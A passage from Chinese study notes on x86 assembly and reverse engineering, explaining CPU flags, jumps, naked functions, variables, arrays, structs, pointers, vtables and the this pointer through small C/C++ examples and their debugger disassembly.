<p>零标志 ZF (Zero  Flag)</p>
<p>零标志 ZF 用来反映运算结果是否为 0</p>
<p>如果运算结果为 0，则其值为 1，否则其值为 0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004011A6  |.  85C0                test    eax,eax</span><br><span class="line">004011A8  |.  75 0A               jnz     short 004011B4</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>符号标志 SF (Sign  Flag)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同</span><br><span class="line">MOV AL,7F</span><br><span class="line">ADD AL,2</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>溢出标志 OF (Overflow  Flag)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">溢出标志OF用于反映有符号数加减运算所得结果是否溢出</span><br><span class="line"></span><br><span class="line">最高位进位与溢出的区别：</span><br><span class="line"></span><br><span class="line">进位标志表示无符号数运算结果是否超出范围.</span><br><span class="line"></span><br><span class="line">溢出标志表示有符号数运算结果是否超出范围.</span><br><span class="line"></span><br><span class="line">溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律：</span><br><span class="line"></span><br><span class="line">正 + 正 = 正  如果结果是负数，则说明有溢出</span><br><span class="line">负 + 负 = 负  如果结果是正数，则说明有溢出</span><br><span class="line">正 + 负 永远都不会有溢出</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>方向标志 DF (Direction Flag)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DF=1时串操作为减地址方式 DF=0为增地址方式</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="eflags"><a class="markdownIt-Anchor" href="#eflags">#</a> EFLAGS</h5>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916140608232.png" alt="image-20230916140608232"></p>
<p>pushfd 是 push 的 EFL 中的值，比如 00000246</p>
<h3 id="条件跳转"><a class="markdownIt-Anchor" href="#条件跳转">#</a> 条件跳转</h3>
<h4 id="jcc指令"><a class="markdownIt-Anchor" href="#jcc指令">#</a> JCC 指令</h4>
<p>cc 代表 condition code (状态码)</p>
<p>Jcc 不是单个指令，它只是描述了跳转之前检查条件代码的跳转助记符</p>
<p>例如 JNE，在跳转之前检查条件代码</p>
<p>典型的情况是进行比较 (设置 CC)，然后使用跳转助记符之一</p>
<p>CMP EAX,0</p>
<p>JNE XXXXX</p>
<p>条件代码也可以用 AND、OR、XOR、加法、减法 (当然也可以是 CMP) 等指令来设置</p>
<p>JCC 指令用于改变 EIP（CPU 要读取的指令地址）</p>
<h4 id="jmp指令"><a class="markdownIt-Anchor" href="#jmp指令">#</a> JMP 指令</h4>
<p>JMP 指令：修改 EIP 的值</p>
<p>JMP 指令只影响了 EIP，不影响堆栈和其它通用寄存器</p>
<p>JMP 寄存器 / 立即数 相当于 MOV EIP, 寄存器 / 立即数</p>
<h3 id="空函数-裸函数"><a class="markdownIt-Anchor" href="#空函数-裸函数">#</a> 空函数 / 裸函数</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">int __declspec (naked) Puls()</span><br><span class="line">&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		mov     eax,0</span><br><span class="line">		mov     edx,3</span><br><span class="line">		add     eax,edx</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	Puls();</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00292240 &gt; &gt; \60            pushad</span><br><span class="line">00292241   .  9C            pushfd</span><br><span class="line">00292242   .  B8 00000000   mov     eax,0x0</span><br><span class="line">00292247   .  BA 03000000   mov     edx,0x3</span><br><span class="line">0029224C   .  03C2          add     eax,edx</span><br><span class="line">0029224E   .  9D            popfd</span><br><span class="line">0029224F   .  61            popad</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//空函数        </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">function</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//调用空函数</span></span><br><span class="line">        <span class="built_in">function</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">00E92480</span> &gt;/&gt; \<span class="number">55</span>            push    ebp</span><br><span class="line"><span class="number">00E92481</span>  |.  <span class="number">8B</span>EC          mov     ebp,esp</span><br><span class="line"><span class="number">00E92483</span>  |.  <span class="number">81</span>EC C0000000 sub     esp,<span class="number">0xC0</span></span><br><span class="line"><span class="number">00E92489</span>  |.  <span class="number">53</span>            push    ebx</span><br><span class="line"><span class="number">00E9248</span>A  |.  <span class="number">56</span>            push    esi</span><br><span class="line"><span class="number">00E9248</span>B  |.  <span class="number">57</span>            push    edi</span><br><span class="line"><span class="number">00E9248</span>C  |.  <span class="number">8</span>DBD <span class="number">40F</span>FFFFF lea     edi,[local<span class="number">.48</span>]</span><br><span class="line"><span class="number">00E92492</span>  |.  B9 <span class="number">30000000</span>   mov     ecx,<span class="number">0x30</span></span><br><span class="line"><span class="number">00E92497</span>  |.  B8 CCCCCCCC   mov     eax,<span class="number">0xCCCCCCCC</span></span><br><span class="line"><span class="number">00E9249</span>C  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class="line"><span class="number">00E9249</span>E  |.  <span class="number">5F</span>            pop     edi</span><br><span class="line"><span class="number">00E9249</span>F  |.  <span class="number">5</span>E            pop     esi</span><br><span class="line"><span class="number">00E924</span>A0  |.  <span class="number">5B</span>            pop     ebx</span><br><span class="line"><span class="number">00E924</span>A1  |.  <span class="number">8B</span>E5          mov     esp,ebp</span><br><span class="line"><span class="number">00E924</span>A3  |.  <span class="number">5</span>D            pop     ebp</span><br><span class="line"><span class="number">00E924</span>A4  \.  C3            retn</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="c-程序入口"><a class="markdownIt-Anchor" href="#c-程序入口">#</a> C 程序入口</h3>
<ol>
<li>mainCRTStartup 和 wmainCRTStartup 是控制台环境下多字节编码和 Unicode 编码的启动函数</li>
<li>而 WinMainCRTStartup 和 wWinMainCRTStartup 是 windows 环境下多字节编码和 Unicode 编码的启动函数</li>
</ol>
<p>mainCRTStartup 做了哪些事：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/d7e8c05ca5a843948525ddcbf6db07b9.png" alt="img"></p>
<p>根据 main 函数的三个参数找入口，main 的函数原型如下：</p>
<p><code>int main(int argc,char *argv[],char *envp[])&#123;&#125;</code></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/eacff80fa91044e28df8e670e9ed1e35.png" alt="img"></p>
<p>vs2008 debug 找 main 入口</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916205213461.png" alt="image-20230916205213461"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916205230417.png" alt="image-20230916205230417"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916205252590.png" alt="image-20230916205252590"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916205313967.png" alt="image-20230916205313967"></p>
<h3 id="全局变量和局部变量"><a class="markdownIt-Anchor" href="#全局变量和局部变量">#</a> 全局变量和局部变量</h3>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/414b76cc64ff4c4292c015b238247f76.png" alt="img"></p>
<h4 id="全局变量"><a class="markdownIt-Anchor" href="#全局变量">#</a> 全局变量</h4>
<ol>
<li>
<p><code>MOV 寄存器,byte/word/dword ptr ds:[0x12345678]</code></p>
</li>
<li>
<p>上面的 0x12345678 是固定的地址，每次程序启动都不变</p>
<p>通过寄存器的宽度，或者 byte/word/dword 来判断全局变量的宽度</p>
</li>
<li>
<p>全局变量就是所谓的基址</p>
</li>
</ol>
<h4 id="局部变量"><a class="markdownIt-Anchor" href="#局部变量">#</a> 局部变量</h4>
<ol>
<li>
<p>局部变量在程序编译完成后并没有分配固定的地址</p>
</li>
<li>
<p>在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存</p>
</li>
<li>
<p>当局部变量所属的方法执行完毕后，局部变量所占用的内存将变成垃圾数据。局部变量消失</p>
</li>
<li>
<p>局部变量只能在函数内部使用，函数 A 无法使用函数 B 的局部变量</p>
</li>
<li>
<p>局部变量的反汇编识别</p>
<p>[ebp-4]</p>
<p>[ebp-8]</p>
<p>[ebp-0xC]</p>
</li>
</ol>
<h3 id="类型转换"><a class="markdownIt-Anchor" href="#类型转换">#</a> 类型转换</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MOVSX</span><br><span class="line">先符号扩展,再传送</span><br><span class="line">MOV AL,0FF</span><br><span class="line">MOVSX CX,AL</span><br><span class="line">MOV AL,80</span><br><span class="line">MOVSX CX,AL</span><br><span class="line"></span><br><span class="line">MOVZX</span><br><span class="line">先零扩展,再传送</span><br><span class="line">MOV AL,0FF</span><br><span class="line">MOVZX CX,AL</span><br><span class="line">MOV AL,80</span><br><span class="line">MOVSX CX,AL</span><br></pre></td></tr></table></figure>
<h3 id="数组"><a class="markdownIt-Anchor" href="#数组">#</a> 数组</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">int arr[5]=&#123;1,2,3,4,5&#125;;</span><br><span class="line">0040D71D    C745 E0 01000000      mov     dword ptr ss:[ebp-0x20],0x1</span><br><span class="line">0040D724    C745 E4 02000000      mov     dword ptr ss:[ebp-0x1C],0x2</span><br><span class="line">0040D72B    C745 E8 03000000      mov     dword ptr ss:[ebp-0x18],0x3</span><br><span class="line">0040D732    C745 EC 04000000      mov     dword ptr ss:[ebp-0x14],0x4</span><br><span class="line">0040D739    C745 F0 05000000      mov     dword ptr ss:[ebp-0x10],0x5</span><br><span class="line"></span><br><span class="line">0040D756    8B4C85 E0             mov     ecx,dword ptr ss:[ebp+eax*4-0x20]</span><br><span class="line">取下标的方式，eax=1 时，取的是 0x2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int arr[3][4]=&#123;</span><br><span class="line">    &#123;1,2,3,4&#125;,</span><br><span class="line">    &#123;5,6,7,8&#125;,</span><br><span class="line">    &#123;9,10,11,12&#125;</span><br><span class="line">&#125;;</span><br><span class="line">0040D7CE    C745 D0 01000000      mov     dword ptr ss:[ebp-0x30],0x1</span><br><span class="line">0040D7D5    C745 D4 02000000      mov     dword ptr ss:[ebp-0x2C],0x2</span><br><span class="line">0040D7DC    C745 D8 03000000      mov     dword ptr ss:[ebp-0x28],0x3</span><br><span class="line">0040D7E3    C745 DC 04000000      mov     dword ptr ss:[ebp-0x24],0x4</span><br><span class="line">0040D7EA    C745 E0 05000000      mov     dword ptr ss:[ebp-0x20],0x5</span><br><span class="line">0040D7F1    C745 E4 06000000      mov     dword ptr ss:[ebp-0x1C],0x6</span><br><span class="line">0040D7F8    C745 E8 07000000      mov     dword ptr ss:[ebp-0x18],0x7</span><br><span class="line">0040D7FF    C745 EC 08000000      mov     dword ptr ss:[ebp-0x14],0x8</span><br><span class="line">0040D806    C745 F0 09000000      mov     dword ptr ss:[ebp-0x10],0x9</span><br><span class="line">0040D80D    C745 F4 0A000000      mov     dword ptr ss:[ebp-0xC],0xA</span><br><span class="line">0040D814    C745 F8 0B000000      mov     dword ptr ss:[ebp-0x8],0xB</span><br><span class="line">0040D81B    C745 FC 0C000000      mov     dword ptr ss:[ebp-0x4],0xC</span><br><span class="line"></span><br><span class="line">0040D828    C745 C8 01000000      mov     dword ptr ss:[ebp-0x38],0x1</span><br><span class="line">0040D82F    C745 C4 02000000      mov     dword ptr ss:[ebp-0x3C],0x2</span><br><span class="line">0040D836    8B4D C8               mov     ecx,dword ptr ss:[ebp-0x38]</span><br><span class="line">0040D839    C1E1 04               shl     ecx,0x4</span><br><span class="line">0040D83C    8D540D D0             lea     edx,dword ptr ss:[ebp+ecx-0x30]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="结构体"><a class="markdownIt-Anchor" href="#结构体">#</a> 结构体</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">struct Player&#123;</span><br><span class="line">    float hp;                //人物血量</span><br><span class="line">    float mp;                //人物魔力值</span><br><span class="line">    int money;                //人物金钱</span><br><span class="line">    int atk;                //人物攻击力</span><br><span class="line">    char name[10];        //人物昵称</span><br><span class="line">    float x;                //人物x坐标</span><br><span class="line">    float y;                //人物y坐标</span><br><span class="line">&#125;;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	Player player;</span><br><span class="line">	</span><br><span class="line">	player.hp=100;</span><br><span class="line">	player.mp=50;</span><br><span class="line">	player.money=1000;</span><br><span class="line">	player.atk=10;        </span><br><span class="line">	strcpy(player.name,&quot;lyl610abc&quot;);</span><br><span class="line">	player.x=600;</span><br><span class="line">	player.y=100;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">00401028    C745 DC 0000C842      mov     dword ptr ss:[ebp-0x24],0x42C80000</span><br><span class="line">0040102F    C745 E0 00004842      mov     dword ptr ss:[ebp-0x20],0x42480000</span><br><span class="line">00401036    C745 E4 E8030000      mov     dword ptr ss:[ebp-0x1C],0x3E8</span><br><span class="line">0040103D    C745 E8 0A000000      mov     dword ptr ss:[ebp-0x18],0xA</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="内存对齐"><a class="markdownIt-Anchor" href="#内存对齐">#</a> 内存对齐</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">内存对齐</span><br><span class="line">内存对齐也称作字节对齐</span><br><span class="line">前面或多或少都有提到过内存对齐，但没有具体展开，现在来谈谈内存对齐</span><br><span class="line">为什么要内存对齐</span><br><span class="line">性能原因</span><br><span class="line">寻址时提高效率，采用了以空间换时间的思想</span><br><span class="line">当寻址的内存的单位和本机宽度一致时，寻址的效率最高</span><br><span class="line">举个例子：</span><br><span class="line"></span><br><span class="line">在32位的机器上，一次读32位（4字节）的内存 效率最高</span><br><span class="line">在64位的机器上，一次读64位（8字节）的内存 效率最高</span><br></pre></td></tr></table></figure>
<h3 id="指针"><a class="markdownIt-Anchor" href="#指针">#</a> 指针</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void function()&#123;                </span><br><span class="line">    char* a;</span><br><span class="line">    a=(char*) 610;</span><br><span class="line">    int** b;</span><br><span class="line">    b=(int**) 610;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">00401028    C745 FC 62020000      mov     dword ptr ss:[ebp-0x4],0x262</span><br><span class="line">0040102F    C745 F8 62020000      mov     dword ptr ss:[ebp-0x8],0x262</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="c"><a class="markdownIt-Anchor" href="#c">#</a> C++</h2>
<h3 id="虚表指针"><a class="markdownIt-Anchor" href="#虚表指针">#</a> 虚表指针</h3>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/62c52b62bffc438695370d0b5e1e70f6.png" alt="img"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/6fcf58bc7a2a45cdae89fe8d0f28c5d0.jpg" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">base_class</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_base;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">v_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;This is base_class&#x27;s v_func1()&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">v_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;This is base_class&#x27;s v_func2()&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">v_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;This is base_class&#x27;s v_func3()&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	base_class bc;</span><br><span class="line">	bc.<span class="built_in">v_func1</span>();</span><br><span class="line">	bc.<span class="built_in">v_func2</span>();</span><br><span class="line">	bc.<span class="built_in">v_func3</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>lea     ecx,dword ptr ss:[ebp-0x8]   此时 ecx 保存的是 this 指针</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917151414247.png" alt="image-20230917151414247"></p>
<p>此时 [eax] 中的值就是虚表指针的首地址，就是上图的__vfptr，其实这个地址也是一个全局变量，或者说基址</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917151703299.png" alt="image-20230917151703299"></p>
<p>跟入 [eax]，里面就是每个虚函数的指针，其实就是 [__vfptr]</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917152129266.png" alt="image-20230917152129266"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917152038205.png" alt="image-20230917152038205"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917151829721.png" alt="image-20230917151829721"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917153047111.png" alt="image-20230917153047111"></p>
<h3 id="继承"><a class="markdownIt-Anchor" href="#继承">#</a> 继承</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">employee</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">employee</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;employee()!\n&quot;</span>);&#125;</span><br><span class="line">	~<span class="built_in">employee</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;~employee()!\n&quot;</span>);&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">manager</span> : <span class="keyword">public</span> employee</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">manager</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;manager()!\n&quot;</span>);&#125;</span><br><span class="line">	~<span class="built_in">manager</span>() &#123;  <span class="built_in">printf</span>(<span class="string">&quot;~maneger()!\n&quot;</span>);&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	manager my;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>call 01331113 调用了 manager 类，跟入</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917155627489.png" alt="image-20230917155627489"></p>
<p>由于 manger 类是继承的 employee 类，因此 manger 类中会调用 employee 类，即 call 013310A0</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917155735578.png" alt="image-20230917155735578"></p>
<p>mov ecx,dword ptr ss:[ebp-8] 就是 this 指针。由于没有调用函数，此时指向的值为 CC</p>
<h3 id="this"><a class="markdownIt-Anchor" href="#this">#</a> this</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">struct MyStruct</span><br><span class="line">&#123;</span><br><span class="line">	int x ;</span><br><span class="line">	int y ;</span><br><span class="line">	//函数在结构体内部</span><br><span class="line">	int Max(MyStruct* str)</span><br><span class="line">	&#123;</span><br><span class="line">		return str-&gt;x &gt; str-&gt;y ? str-&gt;x :str-&gt;y ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">int main(int argc, CHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	MyStruct haha ;</span><br><span class="line">	haha.x = 1 ;</span><br><span class="line">	haha.y = 2 ;</span><br><span class="line">        haha.Max(&amp;haha);</span><br><span class="line">        printf(&quot;%d\n&quot;,haha.Max(&amp;haha));</span><br><span class="line">	printf(&quot;%d\n&quot;,sizeof(haha));</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此处 ecx 就是 this 指针</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917165815847.png" alt="image-20230917165815847"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917165956983.png" alt="image-20230917165956983"></p>
<p>this 指针指的其实就是结构体首地址，通过 this 指针偏移可以很容易地访问结构体中的变量</p>
<h3 id="析构和构造识别"><a class="markdownIt-Anchor" href="#析构和构造识别">#</a> 析构和构造识别</h3>
